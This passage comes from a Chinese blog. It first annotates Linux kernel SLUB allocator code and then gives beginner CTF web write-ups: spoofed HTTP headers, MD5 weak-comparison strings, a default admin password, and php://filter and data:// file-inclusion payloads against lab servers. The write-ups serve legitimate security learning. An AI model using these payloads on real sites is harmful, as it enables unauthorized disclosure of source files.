<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kmem_cache_alloc()-&gt;slab_alloc()-&gt;slab_alloc_node()</span><br></pre></td></tr></table></div></figure>

<p>从<code>slab_alloc_node()</code>函数开始分配</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /mm/slub.c</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *<span class="title">slab_alloc_node</span><span class="params">(struct kmem_cache *s,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *object;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> tid;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">obj_cgroup</span> *<span class="title">objcg</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取对应的kmem_cache描述符</span></span><br><span class="line">	s = slab_pre_alloc_hook(s, &amp;objcg, <span class="number">1</span>, gfpflags);</span><br><span class="line">	<span class="keyword">if</span> (!s)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">redo:</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//尝试从本地缓冲池进行分配</span></span><br><span class="line">	object = c-&gt;freelist;</span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(!object || !node_match(page, node))) &#123;</span><br><span class="line">        <span class="comment">//本地缓冲池已分配完毕</span></span><br><span class="line">        <span class="comment">//分配不成功就进入后续的__slab_alloc()函数</span></span><br><span class="line">		object = __slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">		stat(s, ALLOC_SLOWPATH);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//相关SLUB保护的指针运算</span></span><br><span class="line">		<span class="keyword">void</span> *next_object = get_freepointer_safe(s, object);</span><br><span class="line">		<span class="comment">//...一大堆检查</span></span><br><span class="line">	&#125;</span><br><span class="line">    <span class="comment">//一大堆检查看不太懂</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h2 id="1-本地缓冲池分配-1"   >
          <a href="#1-本地缓冲池分配-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-本地缓冲池分配-1" class="headerlink" title="1.本地缓冲池分配"></a>1.本地缓冲池分配</h2>
      <p>这个就不说了，直接就是从本地的<code>kmem_cache_cpu</code>下<code>cpu_slab</code>的<code>freelist</code>开始分配，上面的<code>slab_alloc_node()</code>函数中也相关体现了。</p>
<p>之后在<code>__slab_alloc()</code>函数中进行相关判断后会进入到<code>___slab_alloc()</code>函数，进行后续的不同情况判断。不是很懂在干嘛，和<code>CONFIG_PREEMPTION</code>配置有关。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//v5.9 /mm/slub.c</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *__slab_alloc(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node,</span><br><span class="line">			  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, struct kmem_cache_cpu *c)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *p;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">	local_irq_save(flags);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PREEMPTION</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We may have been preempted and rescheduled on a different</span></span><br><span class="line"><span class="comment">	 * cpu before disabling interrupts. Need to reload cpu area</span></span><br><span class="line"><span class="comment">	 * pointer.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	c = this_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	p = ___slab_alloc(s, gfpflags, node, addr, c);</span><br><span class="line">	local_irq_restore(flags);</span><br><span class="line">	<span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>如下，当<code>cpu_slab-&gt;freelist</code>被分配完毕之后，<code>cpu_slab-&gt;page</code>也被清空<img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519192842119.png" alt="image-20220519192842119"></p>

        <h2 id="2-partial分配"   >
          <a href="#2-partial分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-partial分配" class="headerlink" title="2.partial分配"></a>2.<code>partial</code>分配</h2>
      <p>在定义配置时，需要<code>CONFIG_SLUB_CPU_PARTIAL=y</code>才会有</p>
<p>进入<code>___slab_alloc()</code>函数后，会分为不少情况</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> *___slab_alloc(struct kmem_cache *s, <span class="keyword">gfp_t</span> gfpflags, <span class="keyword">int</span> node,</span><br><span class="line">			  <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, struct kmem_cache_cpu *c)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *freelist;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">	<span class="comment">//这个c即为对应kmalloc-xx下的cpu_slab</span></span><br><span class="line">    <span class="comment">//检查page是否为NULL,如果为NULL代表本地缓冲池的freelist已经分配完毕</span></span><br><span class="line">    <span class="comment">//那么就会进入到new_slab</span></span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (!page) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * if the node is not online or has no normal memory, just</span></span><br><span class="line"><span class="comment">		 * ignore the node constraint</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (unlikely(node != NUMA_NO_NODE &amp;&amp;</span><br><span class="line">			     !node_state(node, N_NORMAL_MEMORY)))</span><br><span class="line">			node = NUMA_NO_NODE;</span><br><span class="line">		<span class="keyword">goto</span> new_slab;</span><br><span class="line">	&#125;</span><br><span class="line">redo:</span><br><span class="line">    <span class="comment">//这里有一些匹配检查,会检查page的nid和node是否能对上</span></span><br><span class="line">    <span class="comment">//不能对上就不会进行相关分配,接着重来,不太懂</span></span><br><span class="line">    <span class="comment">//也常常碰上不匹配的partial</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!node_match(page, node))) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * same as above but node_match() being false already</span></span><br><span class="line"><span class="comment">		 * implies node != NUMA_NO_NODE</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (!node_state(node, N_NORMAL_MEMORY)) &#123;</span><br><span class="line">			node = NUMA_NO_NODE;</span><br><span class="line">			<span class="keyword">goto</span> redo;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			stat(s, ALLOC_NODE_MISMATCH);</span><br><span class="line">			deactivate_slab(s, page, c-&gt;freelist, c);</span><br><span class="line">			<span class="keyword">goto</span> new_slab;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//.....</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/* must check again c-&gt;freelist in case of cpu migration or IRQ */</span></span><br><span class="line">	freelist = c-&gt;freelist;</span><br><span class="line">	<span class="keyword">if</span> (freelist)</span><br><span class="line">		<span class="keyword">goto</span> load_freelist;</span><br><span class="line">    </span><br><span class="line">	freelist = get_freelist(s, page);</span><br><span class="line">	<span class="keyword">if</span> (!freelist) &#123;</span><br><span class="line">		c-&gt;page = <span class="literal">NULL</span>;</span><br><span class="line">		stat(s, DEACTIVATE_BYPASS);</span><br><span class="line">		<span class="keyword">goto</span> new_slab;</span><br><span class="line">	&#125;</span><br><span class="line">	stat(s, ALLOC_REFILL);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//本地CPU的page被赋值之后,加载freelist的过程</span></span><br><span class="line">load_freelist:</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * freelist is pointing to the list of objects to be used.</span></span><br><span class="line"><span class="comment">	 * page is pointing to the page from which the objects are obtained.</span></span><br><span class="line"><span class="comment">	 * That page must be frozen for per cpu allocations to work.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	VM_BUG_ON(!c-&gt;page-&gt;frozen);</span><br><span class="line">	c-&gt;freelist = get_freepointer(s, freelist);</span><br><span class="line">	c-&gt;tid = next_tid(c-&gt;tid);</span><br><span class="line">	<span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//这里完成本地CPU的partial寻找以及重新从buddy伙伴中分配slab描述符</span></span><br><span class="line">new_slab:</span><br><span class="line">    <span class="comment">//检查本地CPU的partial是否存在</span></span><br><span class="line">	<span class="keyword">if</span> (slub_percpu_partial(c)) &#123;</span><br><span class="line">        <span class="comment">//本地CPU的partial则直接赋值给本地CPU的page,进入redo加载freelist</span></span><br><span class="line">		page = c-&gt;page = slub_percpu_partial(c);</span><br><span class="line">  		<span class="comment">//对本地CPU刚赋值的page进行相关设置,包括slab_cache等之类的设置</span></span><br><span class="line">		slub_set_percpu_partial(c, page);</span><br><span class="line">		stat(s, CPU_PARTIAL_ALLOC);</span><br><span class="line">        <span class="comment">//跳转redo,依据新的page重新加载freelist</span></span><br><span class="line">		<span class="keyword">goto</span> redo;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//new_slab_objects会检查当前kmalloc-xx对应的node下</span></span><br><span class="line">    <span class="comment">//是否存在partial可供分配,没有则会从buddy伙伴系统中分配slab页框描述符</span></span><br><span class="line">	freelist = new_slab_objects(s, gfpflags, node, &amp;c);</span><br><span class="line">	<span class="comment">//后面就是一些相关的检查及加载freelist</span></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!freelist)) &#123;</span><br><span class="line">		slab_out_of_memory(s, gfpflags, node);</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	page = c-&gt;page;</span><br><span class="line">	<span class="keyword">if</span> (likely(!kmem_cache_debug(s) &amp;&amp; pfmemalloc_match(page, gfpflags)))</span><br><span class="line">		<span class="keyword">goto</span> load_freelist;</span><br><span class="line">    <span class="comment">//............</span></span><br><span class="line">	deactivate_slab(s, page, get_freepointer(s, freelist), c);</span><br><span class="line">	<span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


        <h3 id="1-本地CPU的partial"   >
          <a href="#1-本地CPU的partial" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-本地CPU的partial" class="headerlink" title="(1)本地CPU的partial"></a>(1)本地CPU的<code>partial</code></h3>
      <p>首先就是判断本地<code>CPU</code>，即<code>cpu_slab</code>的<code>partial</code>，其也为一个<code>page</code>页框，会与其他的页框依据<code>struct list_head lru;</code>域组成双向循环链表。</p>
<ul>
<li><p>如果存在，则将该<code>partial</code>当作一个<code>slab</code>描述页框<code>page</code>，遍历其<code>struct list_head lru;</code>域，找到合适的<code>slab</code>描述页框<code>page</code>，赋值给<code>cpu_slab-&gt;page</code>，并且该<code>partial</code>也会在<code>slub_set_percpu_partial(c, page);</code>函数中被原本的<code>partial</code>的<code>next</code>覆盖。</p>
<p>请忽略这个<code>freelist</code>上还有值，截图的时候没有分配光<code>freelist</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519210608695.png" alt="image-20220519210608695"></p>
<p>完成之后如下所示，被覆盖掉</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519211038094.png" alt="image-20220519211038094"></p>
</li>
<li><p>然后进入<code>redo</code>，依据新赋值的<code>page</code>加载<code>freelist</code>，并且保存在<code>page</code>中的<code>freelist</code>被置空，最终如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519211452815.png" alt="image-20220519211452815"></p>
</li>
</ul>

        <h3 id="2-node中的partial"   >
          <a href="#2-node中的partial" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-node中的partial" class="headerlink" title="(2)node中的partial"></a>(2)<code>node</code>中的<code>partial</code></h3>
      <p>然后进入<code>new_slab_objects</code>函数判断本<code>kmalloc-xx</code>对应的<code>node</code>中是否存在<code>partial</code>，存在则进行相关赋值后，直接返回<code>freelist</code></p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span> *<span class="title">new_slab_objects</span><span class="params">(struct kmem_cache *s, <span class="keyword">gfp_t</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">			<span class="keyword">int</span> node, struct kmem_cache_cpu **pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">void</span> *freelist;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_cpu</span> *<span class="title">c</span> =</span> *pc;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">    <span class="comment">//查看本kmalloc-xx对应的node中的partial是否存在</span></span><br><span class="line">    <span class="comment">//存在进行相关赋值后直接返回freelist了</span></span><br><span class="line">	freelist = get_partial(s, flags, node, c);</span><br><span class="line">	<span class="keyword">if</span> (freelist)</span><br><span class="line">		<span class="keyword">return</span> freelist;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//本kmalloc-xx对应的node中的partial不存在,从buddy伙伴系统分配</span></span><br><span class="line">	page = new_slab(s, flags, node);</span><br><span class="line">	<span class="keyword">if</span> (page) &#123;</span><br><span class="line">		c = raw_cpu_ptr(s-&gt;cpu_slab);</span><br><span class="line">		<span class="keyword">if</span> (c-&gt;page)</span><br><span class="line">			flush_slab(s, c);</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * No other reference to the page yet so we can</span></span><br><span class="line"><span class="comment">		 * muck around with it freely without cmpxchg</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		freelist = page-&gt;freelist;</span><br><span class="line">		page-&gt;freelist = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">		stat(s, ALLOC_SLAB);</span><br><span class="line">		c-&gt;page = page;</span><br><span class="line">		*pc = c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> freelist;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>

<p>这里有点奇怪的是，遍历对应<code>struct kmem_cache</code>的<code>kmalloc-xx</code>下的<code>node</code>时，其<code>partial</code>指向的是<code>page</code>的<code>struct list_head lru;</code>域地址，而非实际的<code>page</code>地址，所以真实的<code>page</code>地址为<code>struct list_head lru;</code>域地址减去<code>0x8</code>。</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220519201826071.png" alt="image-20220519201826071"></p>
<p>之后即从该<code>page</code>中取<code>freelist</code>进行赋值给本地的<code>kmem_cache_cpu</code>下<code>cpu_slab</code>的<code>freelist</code>，即本地缓冲池。</p>

        <h2 id="3-buddy分配"   >
          <a href="#3-buddy分配" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-buddy分配" class="headerlink" title="3.buddy分配"></a>3.buddy分配</h2>
      <p>如上述所示，在<code>new_slab_objects()</code>中判断<code>partial</code>不存在之后，即从buddy伙伴算法中分配新的<code>slab</code>页框描述符，之后就太复杂了，后续再学把。</p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/03/09/NSSCTF-Web%E5%AE%89%E5%85%A8%E5%85%A5%E9%97%A8/">NSSCTF-Web安全入门刷题</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2023-03-09</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2023-09-11</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="SWPUCTF-2021-新生赛-jicao"   >
          <a href="#SWPUCTF-2021-新生赛-jicao" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h1>
      <figure class="highlight php"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$json</span>=json_decode(<span class="variable">$_GET</span>[<span class="string">&#x27;json&#x27;</span>],<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$id</span>==<span class="string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="variable">$json</span>[<span class="string">&#x27;x&#x27;</span>]==<span class="string">&quot;wllm&quot;</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span> <span class="variable">$flag</span>;&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></div></figure>

<p>传入两个参数即可</p>

        <h1 id="SWPUCTF-2021-新生赛-Do-you-know-http"   >
          <a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h1>
      <p>访问如下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120854983.png" alt="image-20230107120854983"></p>
<p>浏览器不对，那么首先需要修改<code>User-Agent</code>为<code>WLLM</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107120925542.png" alt="image-20230107120925542"></p>
<p>跟随重定向后跳转到<code>a.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121003165.png" alt="image-20230107121003165"></p>
<p>发现来源<code>IP</code>不对，那么需要修改<code>X-Forwarded-For</code>字段</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121230587.png" alt="image-20230107121230587"></p>
<p>跟随重定向后得到最终<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107121237694.png" alt="image-20230107121237694"></p>

        <h1 id="SWPUCTF-2021-新生赛-gift-F12"   >
          <a href="#SWPUCTF-2021-新生赛-gift-F12" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h1>
      <p>确实如名字，<code>F12</code>在元素资源中可以找到</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107145303596.png" alt="image-20230107145303596"></p>

        <h1 id="第五空间-2021-WebFTP"   >
          <a href="#第五空间-2021-WebFTP" class="heading-link"><i class="fas fa-link"></i></a><a href="#第五空间-2021-WebFTP" class="headerlink" title="[第五空间 2021]WebFTP"></a>[第五空间 2021]WebFTP</h1>
      <p><code>dirsearch</code>扫描之后，在<code>readm.txt</code>中找到对应的超级管理员账号密码<code>admin/admin888</code></p>
<p>登录进去之后，在<code>phpinfo.php</code>中找到<code>flag</code>，或者不用登录，直接<code>/phpinfo.php</code>就能找到，应该是所谓非预期，下面看看预期解</p>
<p>同样该<code>WebFTP</code>是<code>github</code>上一个老框架，可以在<code>/Readme/mytz.php</code>中存在敏感信息泄露漏洞</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107153916700.png" alt="image-20230107153916700"></p>
<p>或者<code>seay</code>好像可以审计出来</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107154534824.png" alt="image-20230107154534824"></p>
<p>对应泄露为<code>/Readme/mytz.php?act=phpinfo</code></p>

        <h1 id="SWPUCTF-2021-新生赛-easy-md5"   >
          <a href="#SWPUCTF-2021-新生赛-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h1>
      <p><code>md5</code>弱比较</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155030276.png" alt="image-20230107155030276"></p>
<p>使用<code>QNKCDZO</code>和<code>s214587387a</code>即可</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155126859.png" alt="image-20230107155126859"></p>

        <h1 id="SWPUCTF-2021-新生赛-include"   >
          <a href="#SWPUCTF-2021-新生赛-include" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h1>
      <p>提示传入<code>file</code>参数，然后得到源码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155613921.png" alt="image-20230107155613921"></p>
<p>由于最后会使用<code>include_once</code>将对应<code>file</code>包含进来，那么可以使用相关的<code>php</code>伪协议</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><code>base64</code>解码后得到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107155718000.png" alt="image-20230107155718000"></p>

        <h1 id="SWPUCTF-2021-新生赛-PseudoProtocols"   >
          <a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="heading-link"><i class="fas fa-link"></i></a><a href="#SWPUCTF-2021-新生赛-PseudoProtocols" class="headerlink" title="[SWPUCTF 2021 新生赛]PseudoProtocols"></a>[SWPUCTF 2021 新生赛]PseudoProtocols</h1>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160859666.png" alt="image-20230107160859666"></p>
<p>首先看到提示，并且<code>URL</code>中为<code>/...?wllm=...</code>，很明显就是想让我们填一个东西，试试<code>hint.php</code>填入</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107160953981.png" alt="image-20230107160953981"></p>
<p>啥也没有，那么尝试用一下<code>php</code>伪协议</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://1.14.71.254:28530/index.php?wllm=php://filter/read=convert.base64-encode/resource=hint.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161034318.png" alt="image-20230107161034318"></p>
<p>可以看到出来了，<code>base64</code>解一下查看内容</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161117359.png" alt="image-20230107161117359"></p>
<p>让我们访问<code>/test2222222222222.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161156905.png" alt="image-20230107161156905"></p>
<p>主要关注如下，需要设置<code>a</code>，然后其内容为<code>I want flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161205486.png" alt="image-20230107161205486"></p>
<p>由于用的是<code>file_get_contents</code>函数，那么可以使用<code>data</code>数据流</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/test2222222222222.php?a=data://text/plain,I%20want%20flag</span><br></pre></td></tr></table></div></figure>

<p>得到<code>flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20230107161327121.png" alt="image-20230107161327121"></p>

        <h1 id="NISACTF-2022-easyssrf"   >
